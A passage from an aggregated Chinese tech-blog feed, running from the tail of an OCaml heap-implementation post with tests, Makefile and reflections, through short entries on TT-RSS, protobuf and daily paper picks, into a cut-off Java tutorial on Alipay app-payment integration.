    <span class="nn">H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">3</span> <span class="n">t</span> <span class="o">|&gt;</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">5</span> <span class="o">|&gt;</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">1</span> <span class="o">|&gt;</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">4</span>
    <span class="o">|&gt;</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">2</span>
  <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="n">5</span><span class="o">);</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">deleteTop</span> <span class="n">t</span> <span class="o">|&gt;</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">deleteTop</span> <span class="o">|&gt;</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="o">=</span> <span class="n">3</span><span class="o">);</span>
  <span class="nn">List</span><span class="p">.</span><span class="n">iter</span> <span class="o">(</span><span class="nn">Printf</span><span class="p">.</span><span class="n">printf</span> <span class="s2">&#34;%d &#34;</span><span class="o">)</span> <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">toList</span> <span class="n">t</span><span class="o">);</span>
  <span class="n">print_newline</span> <span class="bp">()</span>

<span class="c">(* 测试从 list 构建和生成 list *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">l</span> <span class="o">=</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">toList</span> <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">fromList</span> <span class="o">[</span> <span class="n">4</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">1</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">0</span> <span class="o">])</span> <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="n">l</span> <span class="o">=</span> <span class="o">[</span> <span class="n">7</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">1</span><span class="o">;</span> <span class="n">0</span> <span class="o">]);</span>
  <span class="nn">List</span><span class="p">.</span><span class="n">iter</span> <span class="o">(</span><span class="nn">Printf</span><span class="p">.</span><span class="n">printf</span> <span class="s2">&#34;%d &#34;</span><span class="o">)</span> <span class="n">l</span><span class="o">;</span>
  <span class="n">print_newline</span> <span class="bp">()</span>

<span class="c">(* 测试合并两个堆 *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">t</span> <span class="o">=</span>
    <span class="nn">H_int</span><span class="p">.</span><span class="n">merge</span>
      <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">fromList</span> <span class="o">[</span> <span class="n">1</span><span class="o">;</span> <span class="n">3</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">9</span> <span class="o">])</span>
      <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">fromList</span> <span class="o">[</span> <span class="n">2</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">8</span> <span class="o">])</span>
  <span class="k">in</span>
  <span class="k">let</span> <span class="n">l</span> <span class="o">=</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">toList</span> <span class="n">t</span> <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="n">l</span> <span class="o">=</span> <span class="o">[</span> <span class="n">9</span><span class="o">;</span> <span class="n">8</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">3</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">1</span> <span class="o">]);</span>
  <span class="nn">List</span><span class="p">.</span><span class="n">iter</span> <span class="o">(</span><span class="nn">Printf</span><span class="p">.</span><span class="n">printf</span> <span class="s2">&#34;%d &#34;</span><span class="o">)</span> <span class="n">l</span><span class="o">;</span>
  <span class="n">print_newline</span> <span class="bp">()</span>

<span class="c">(* string 型小顶堆 *)</span>
<span class="k">module</span> <span class="nc">H_string</span> <span class="o">=</span> <span class="nn">Heap</span><span class="p">.</span><span class="nc">Make</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span>

<span class="k">let</span> <span class="n">t</span> <span class="o">=</span> <span class="nn">H_string</span><span class="p">.</span><span class="n">create</span> <span class="bp">()</span>

<span class="c">(* 测试基本的插入、删除等操作 *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">t</span> <span class="o">=</span>
    <span class="nn">H_string</span><span class="p">.</span><span class="n">insert</span> <span class="s2">&#34;asdf&#34;</span> <span class="n">t</span> <span class="o">|&gt;</span> <span class="nn">H_string</span><span class="p">.</span><span class="n">insert</span> <span class="s2">&#34;qwer&#34;</span> <span class="o">|&gt;</span> <span class="nn">H_string</span><span class="p">.</span><span class="n">insert</span> <span class="s2">&#34;zz&#34;</span>
  <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">H_string</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="s2">&#34;asdf&#34;</span><span class="o">);</span>
  <span class="k">assert</span> <span class="o">(</span>
    <span class="nn">H_string</span><span class="p">.</span><span class="n">toList</span>
      <span class="o">(</span><span class="nn">H_string</span><span class="p">.</span><span class="n">deleteTop</span> <span class="n">t</span> <span class="o">|&gt;</span> <span class="nn">H_string</span><span class="p">.</span><span class="n">deleteTop</span> <span class="o">|&gt;</span> <span class="nn">H_string</span><span class="p">.</span><span class="n">insert</span> <span class="s2">&#34;bb&#34;</span><span class="o">)</span>
    <span class="o">=</span> <span class="o">[</span> <span class="s2">&#34;bb&#34;</span><span class="o">;</span> <span class="s2">&#34;zz&#34;</span> <span class="o">]</span> <span class="o">)</span>

<span class="c">(* 测试 string 类型上的操作 *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">l</span> <span class="o">=</span>
    <span class="nn">H_string</span><span class="p">.</span><span class="n">toList</span>
      <span class="o">(</span><span class="nn">H_string</span><span class="p">.</span><span class="n">merge</span>
         <span class="o">(</span><span class="nn">H_string</span><span class="p">.</span><span class="n">fromList</span> <span class="o">[</span> <span class="s2">&#34;Z&#34;</span><span class="o">;</span> <span class="s2">&#34;Y&#34;</span><span class="o">;</span> <span class="s2">&#34;X&#34;</span> <span class="o">])</span>
         <span class="o">(</span><span class="nn">H_string</span><span class="p">.</span><span class="n">fromList</span> <span class="o">[</span> <span class="s2">&#34;y&#34;</span><span class="o">;</span> <span class="s2">&#34;z&#34;</span><span class="o">;</span> <span class="s2">&#34;x&#34;</span> <span class="o">]))</span>
  <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="n">l</span> <span class="o">=</span> <span class="o">[</span> <span class="s2">&#34;X&#34;</span><span class="o">;</span> <span class="s2">&#34;Y&#34;</span><span class="o">;</span> <span class="s2">&#34;Z&#34;</span><span class="o">;</span> <span class="s2">&#34;x&#34;</span><span class="o">;</span> <span class="s2">&#34;y&#34;</span><span class="o">;</span> <span class="s2">&#34;z&#34;</span> <span class="o">]);</span>
  <span class="nn">List</span><span class="p">.</span><span class="n">iter</span> <span class="o">(</span><span class="nn">Printf</span><span class="p">.</span><span class="n">printf</span> <span class="s2">&#34;%s &#34;</span><span class="o">)</span> <span class="n">l</span><span class="o">;</span>
  <span class="n">print_newline</span> <span class="bp">()</span>

<span class="c">(* int 型大顶堆，采用数组模拟完全二叉树 *)</span>
<span class="k">module</span> <span class="nc">B_H_int</span> <span class="o">=</span> <span class="nn">Binary_heap</span><span class="p">.</span><span class="nc">Make</span> <span class="o">(</span><span class="nc">E</span><span class="o">)</span>

<span class="k">let</span> <span class="n">t</span> <span class="o">=</span> <span class="nn">B_H_int</span><span class="p">.</span><span class="n">create</span> <span class="n">20</span> <span class="n">0</span>

<span class="c">(* 测试基本的插入、删除等操作 *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">1</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">3</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">2</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">4</span> <span class="n">t</span><span class="o">;</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="n">4</span><span class="o">);</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">deleteTop</span> <span class="n">t</span><span class="o">;</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="n">3</span><span class="o">);</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">deleteTop</span> <span class="n">t</span><span class="o">;</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="n">2</span><span class="o">);</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">6</span> <span class="n">t</span><span class="o">;</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="n">6</span><span class="o">);</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">deleteTop</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">deleteTop</span> <span class="n">t</span><span class="o">;</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="n">1</span><span class="o">)</span>

<span class="k">let</span> <span class="n">t</span> <span class="o">=</span> <span class="nn">B_H_int</span><span class="p">.</span><span class="n">create</span> <span class="n">20</span> <span class="n">0</span>

<span class="c">(* 测试生成 list *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">1</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">3</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">2</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">4</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">List</span><span class="p">.</span><span class="n">iter</span> <span class="o">(</span><span class="nn">Printf</span><span class="p">.</span><span class="n">printf</span> <span class="s2">&#34;%d &#34;</span><span class="o">)</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">toList</span> <span class="n">t</span><span class="o">);</span>
  <span class="n">print_newline</span> <span class="bp">()</span>

<span class="c">(* 测试从 list 构建 *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">t</span> <span class="o">=</span> <span class="nn">B_H_int</span><span class="p">.</span><span class="n">fromList</span> <span class="n">20</span> <span class="n">0</span> <span class="o">[</span> <span class="n">1</span><span class="o">;</span> <span class="n">3</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">9</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">8</span><span class="o">;</span> <span class="n">0</span> <span class="o">]</span> <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">toList</span> <span class="n">t</span> <span class="o">=</span> <span class="o">[</span> <span class="n">9</span><span class="o">;</span> <span class="n">8</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">3</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">1</span><span class="o">;</span> <span class="n">0</span> <span class="o">])</span>

<span class="c">(* 测试两种堆实现的结果一致 *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">t1</span> <span class="o">=</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">fromList</span> <span class="o">[</span> <span class="n">1</span><span class="o">;</span> <span class="n">3</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">9</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">8</span><span class="o">;</span> <span class="n">0</span> <span class="o">]</span>
  <span class="ow">and</span> <span class="n">t2</span> <span class="o">=</span> <span class="nn">B_H_int</span><span class="p">.</span><span class="n">fromList</span> <span class="n">20</span> <span class="n">0</span> <span class="o">[</span> <span class="n">1</span><span class="o">;</span> <span class="n">3</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">9</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">8</span><span class="o">;</span> <span class="n">0</span> <span class="o">]</span> <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">toList</span> <span class="n">t1</span> <span class="o">=</span> <span class="nn">B_H_int</span><span class="p">.</span><span class="n">toList</span> <span class="n">t2</span><span class="o">)</span>
</code></pre></div><p>项目采用 <code>make</code> 进行构建</p>
<div class="highlight"><pre class="chroma"><code class="language-makefile" data-lang="makefile"><span class="nf">.PHONY</span><span class="o">:</span>	<span class="n">all</span> <span class="n">clean</span> <span class="n">byte</span> <span class="n">native</span> <span class="n">profile</span> <span class="n">debug</span> <span class="n">test</span> <span class="n">run</span>

<span class="nv">OCB_FLAGS</span> <span class="o">=</span> -tag bin_annot
<span class="nv">OCB</span> <span class="o">=</span> 		ocamlbuild <span class="k">$(</span>OCB_FLAGS<span class="k">)</span>

<span class="nf">all</span><span class="o">:</span> <span class="n">native</span> <span class="n">byte</span>

<span class="nf">clean</span><span class="o">:</span>
	<span class="k">$(</span>OCB<span class="k">)</span> -clean

<span class="nf">native</span><span class="o">:</span>
	<span class="k">$(</span>OCB<span class="k">)</span> main.native

<span class="nf">byte</span><span class="o">:</span>
	<span class="k">$(</span>OCB<span class="k">)</span> main.byte

<span class="nf">profile</span><span class="o">:</span>
	<span class="k">$(</span>OCB<span class="k">)</span> -tag profile main.native

<span class="nf">debug</span><span class="o">:</span>
	<span class="k">$(</span>OCB<span class="k">)</span> -tag debug main.byte

<span class="nf">run</span><span class="o">:</span> <span class="n">native</span>
	./main.native
</code></pre></div><h1 id="心得体会">心得体会</h1>
<p>第一次用纯函数式语言写一个算法，和之前上课时在 <code>toplevel</code> 中测试还是有较大的区别，包括如何实现多文件编译，如何配置编译，如何编写模块等都困扰了我很久。最后依靠文档、手册、github上的一些项目等学会了如何构建一个 <code>Ocaml</code> 项目。</p>
<p>此外，<code>Ocaml</code> 标准库也给了我很大的帮助，里面的标准库如 <code>Set</code> 等都写得很清晰，有很详细的注释，我写的堆的模块结构、函子等都是参考 <code>Set</code> 库的处理方式。</p>
<p>对于函数式语言，特别是纯函数式的思想我也有了更深刻的理解。一开始我还是以命令式的思维来编写代码，认为不使用 <code>for</code> 、<code>while</code> 语句就是函数式，代码中还是存在很多 <code>mutable</code> 、<code>ref</code> 等内容，即存在副作用，也就导致了函数操作还是对一个“对象”进行操作，而不是每次返回一个新的结果。后来参考各种项目、教程，才发现了纯函数式“无副作用”的核心思想及处理方式。</p>
<p>我认为，纯函数式语言更贴近数学模型，可以用非常简练的语句写出算法，其核心是递归和迭代，例如我的堆通过短短几十行语句就实现了，通过一些精巧的递归就实现了命令式语言要写大量循环命令才能实现的功能。但这些简洁也带来了一些问题，比如代码抽象程度较高，理解起来较为困难；大量递归对栈上空间造成很大压力，性能降低了的同时也难以进行大量的计算，需要花费很大的力气去消除尾递归（但通常很难实现）；不允许副作用造成时间、空间的浪费；思维在两种思想中的转换较为困难等。但总的来说，函数式语言还是有很好的前景，从近年来越来越多的语言都开始支持函数式的写法（如 <code>lambda</code> 表达式等）可以看出。如 <code>C++</code> 、<code>Python</code> 、<code>Java</code> 等都有函数式的写法，我在平时编写代码的过程中也会用到函数式语句来简化代码。函数式语言和命令式语言在未来可能会越走越近，取长补短，最后融为一体。</p>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2021/02/alpine-time-call/</id>
        <title><![CDATA[由 TT-RSS 解析数据库地址失败引出的一个问题]]></title>
        <updated>2021-02-23T12:59:07+08:00</updated>
        <link href="https://blog.stdioa.com/2021/02/alpine-time-call/"/>
        <content type="text/html" src="https://blog.stdioa.com/2021/02/alpine-time-call/"><![CDATA[<p>水一篇文章，主要用来告诫自己认真看文档。🌚</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0129.html</id>
        <title><![CDATA[2021-01-29 论文推荐]]></title>
        <updated>2021-01-29T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0129.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0129.html"><![CDATA[2021-01-29 论文推荐]]></content>
        <author>
            <name><![CDATA[S3lab 每日论文推荐]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0128.html</id>
        <title><![CDATA[2021-01-28 论文推荐]]></title>
        <updated>2021-01-28T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0128.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0128.html"><![CDATA[2021-01-28 论文推荐]]></content>
        <author>
            <name><![CDATA[S3lab 每日论文推荐]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0127.html</id>
        <title><![CDATA[2021-01-27 论文推荐]]></title>
        <updated>2021-01-27T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0127.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0127.html"><![CDATA[2021-01-27 论文推荐]]></content>
        <author>
            <name><![CDATA[S3lab 每日论文推荐]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0126.html</id>
        <title><![CDATA[2021-01-26 论文推荐]]></title>
        <updated>2021-01-26T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0126.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0126.html"><![CDATA[2021-01-26 论文推荐]]></content>
        <author>
            <name><![CDATA[S3lab 每日论文推荐]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0125.html</id>
        <title><![CDATA[2021-01-25 论文推荐]]></title>
        <updated>2021-01-25T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0125.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0125.html"><![CDATA[2021-01-25 论文推荐]]></content>
        <author>
            <name><![CDATA[S3lab 每日论文推荐]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2020/12/protobuf-upgrade/</id>
        <title><![CDATA[protobuf 升级后带来的一些坑]]></title>
        <updated>2020-12-27T06:53:32+08:00</updated>
        <link href="https://blog.stdioa.com/2020/12/protobuf-upgrade/"/>
        <content type="text/html" src="https://blog.stdioa.com/2020/12/protobuf-upgrade/"><![CDATA[<p>前段时间把公司某项目依赖的 <code>github.com/golang/protobuf</code> 的版本从 v1.3.3 升级到了 v1.4.2，本文记录了升级过程中遇到的一些问题。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2020/10/16/blog11/</id>
        <title><![CDATA[Java 实现支付宝后台支付接口]]></title>
        <updated>2020-10-16T08:09:55+08:00</updated>
        <link href="http://www.windboy.top/2020/10/16/blog11/"/>
        <content type="text/html" src="http://www.windboy.top/2020/10/16/blog11/"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>项目中需要对商品订单进行支付，这里记录下自己是如何使用 Java 实现支付宝后台支付接口，支付操作为 App 支付。</p><p>官方文档：<a href="https://opendocs.alipay.com/open/204/105297" target="_blank" rel="noopener">https://opendocs.alipay.com/open/204/105297</a> 。</p><h2 id="编码前的准备"><a href="#编码前的准备" class="headerlink" title="编码前的准备"></a>编码前的准备</h2><p>1.<strong>创建应用</strong></p><p>在支付宝开放平台的开发者中心，创建自己的应用，并取得应用的唯一标识 APPID。</p><p>2.<strong>添加支付能力</strong></p><p>在应用详情页面，添加能力-App 支付，并进行签约。</p><p>3.<strong>密钥生成和配置</strong></p><p>为了保障交易身份与数据的安全，需要进行密钥的配置，这里由于是企业的项目，需要配置公钥证书，这里需要用到支付宝开放平台开发助手，生成 CSR 文件：应用公钥、私钥、证书这 3 个文件。详见官网文档：<a href="https://opendocs.alipay.com/open/291/105971" target="_blank" rel="noopener">https://opendocs.alipay.com/open/291/105971</a> 。</p><p>然后需要在应用的开发信息中，设置接口加签方式，上传 CSR 文件，在线生成应用公钥证书即 .crt 文件，然后上传这个证书。上传完成后，还可以下载对应的支付宝公钥证书和支付宝根证书。</p><p>4.<strong>后台集成支付宝的 SDK</strong></p><p>这个 SDK 用于协助解析并验证客户端同步返回的支付结果和异步通知。</p><p>App 端也需要集成支付宝对应的 SDK。</p><h2 id="编写支付接口"><a href="#编写支付接口" class="headerlink" title="编写支付接口"></a>编写支付接口</h2><h3 id="支付宝支付流程图"><a href="#支付宝支付流程图" class="headerlink" title="支付宝支付流程图"></a>支付宝支付流程图</h3><img src="/images/blog11/alipay.png" width="80%"/><h3 id="在-App-端的表现"><a href="#在-App-端的表现" class="headerlink" title="在 App 端的表现"></a>在 App 端的表现</h3><p>用户在 App 上点击立即购买，选择支付方式，点击确定支付调用后台接口并跳转到支付宝 App，付款完成后，跳转回 App，完成支付。</p><h3 id="后台接口的需求"><a href="#后台接口的需求" class="headerlink" title="后台接口的需求"></a>后台接口的需求</h3><p>后台需要提供 3 个接口：订单信息加密、支付宝服务端异步通知、最终付款校验。</p><h3 id="接口-1：订单信息加密"><a href="#接口-1：订单信息加密" class="headerlink" title="接口 1：订单信息加密"></a><strong>接口 1：订单信息加密</strong></h3><p><strong>功能</strong></p><p>传入订单信息，返回加密后的订单字符串，并在项目数据库保存支付宝订单信息。</p><p><strong>密钥验证方式</strong></p><p>支付宝客户端将传送的消息用私钥加密，服务端使用公钥对消息进行验证。</p><p><strong>代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/encrypt"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> AjaxResult <span class="title">getAliPayOrder</span><span class="params">(@RequestParam String orderSn)</span> <span class="keyword">throws</span> AlipayApiException </span>&#123;</span><br><span class="line">  </span><br><span class="line">    EOrder eOrder=eOrderService.selectEOrderByOrderSn(orderSn);</span><br><span class="line"></span><br><span class="line">    AlipaymentOrder alipaymentOrder = <span class="keyword">new</span> AlipaymentOrder();</span><br><span class="line">    alipaymentOrder.setOrderId(eOrder.getOrderId().intValue());</span><br><span class="line">    alipaymentOrder.setOutTradeNo(orderSn);</span><br><span class="line">    alipaymentOrder.setAmount(eOrder.getActualPrice());</span><br><span class="line">    <span class="comment">// 订单生成，等待用户付款</span></span><br><span class="line">    alipaymentOrder.setTradeStatus(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造client</span></span><br><span class="line">    CertAlipayRequest certAlipayRequest = <span class="keyword">new</span> CertAlipayRequest();</span><br><span class="line">    <span class="comment">//设置网关地址</span></span><br><span class="line">    certAlipayRequest.setServerUrl(<span class="string">"https://openapi.alipay.com/gateway.do"</span>);</span><br><span class="line">    <span class="comment">//设置应用Id</span></span><br><span class="line">    certAlipayRequest.setAppId(app_id);</span><br><span class="line">    <span class="comment">//设置应用私钥</span></span><br><span class="line">    certAlipayRequest.setPrivateKey(privateKey);</span><br><span class="line">    <span class="comment">//设置请求格式，固定值json</span></span><br><span class="line">    certAlipayRequest.setFormat(<span class="string">"json"</span>);</span><br><span class="line">    <span class="comment">//设置字符集</span></span><br><span class="line">    certAlipayRequest.setCharset(<span class="string">"UTF-8"</span>);</span><br><span class="line">    <span class="comment">//设置签名类型</span></span><br><span class="line">    certAlipayRequest.setSignType(<span class="string">"RSA2"</span>);</span><br><span class="line">    <span class="comment">//设置应用公钥证书路径</span></span><br><span class="line">    certAlipayRequest.setCertPath(certPath);</span><br><span class="line">    <span class="comment">//设置支付宝公钥证书路径</span></span><br><span class="line">    certAlipayRequest.setAlipayPublicCertPath(alipayPublicCertPath);</span><br><span class="line">    <span class="comment">//设置支付宝根证书路径</span></span><br><span class="line">    certAlipayRequest.setRootCertPath(rootCertPath);</span><br><span class="line">    <span class="comment">//构造client</span></span><br><span class="line">    AlipayClient alipayClient = <span class="keyword">new</span> DefaultAlipayClient(certAlipayRequest);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化具体API对应的request类,类名称和接口名称对应,当前调用接口名称：alipay.trade.app.pay</span></span><br><span class="line">    AlipayTradeAppPayRequest request = <span class="keyword">new</span> AlipayTradeAppPayRequest();</span><br><span class="line">    <span class="comment">//SDK已经封装掉了公共参数，这里只需要传入业务参数。以下方法为sdk的model入参方式(model和biz_content同时存在的情况下取biz_content)。</span></span><br><span class="line">    AlipayTradeAppPayModel model = <span class="keyword">new</span> AlipayTradeAppPayModel();</span><br><span class="line">    model.setBody(<span class="string">"xx"</span>);</span><br><span class="line">    model.setSubject(<span class="string">"xx"</span>);</span><br><span class="line">    model.setOutTradeNo(orderSn);</span><br><span class="line">    model.setTimeoutExpress(<span class="string">"30m"</span>);</span><br><span class="line">    model.setTotalAmount(eOrder.getActualPrice().toString());</span><br><span class="line">    model.setProductCode(<span class="string">"QUICK_MSECURITY_PAY"</span>);</span><br><span class="line">    request.setBizModel(model);</span><br><span class="line">    <span class="comment">// 需要外网需要能直接访问的地址</span></span><br><span class="line">    request.setNotifyUrl(<span class="string">"xxx"</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//这里和普通的接口调用不同，使用的是sdkExecute</span></span><br><span class="line">        AlipayTradeAppPayResponse response = alipayClient.sdkExecute(request);</span><br><span class="line">        <span class="comment">// 如果未发生异常，则记录支付宝订单</span></span><br><span class="line">        alipaymentOrderService.insertAlipaymentOrder(alipaymentOrder);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> AjaxResult.success(response.getBody());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AlipayApiException e) &#123;</span><br><span class="line">        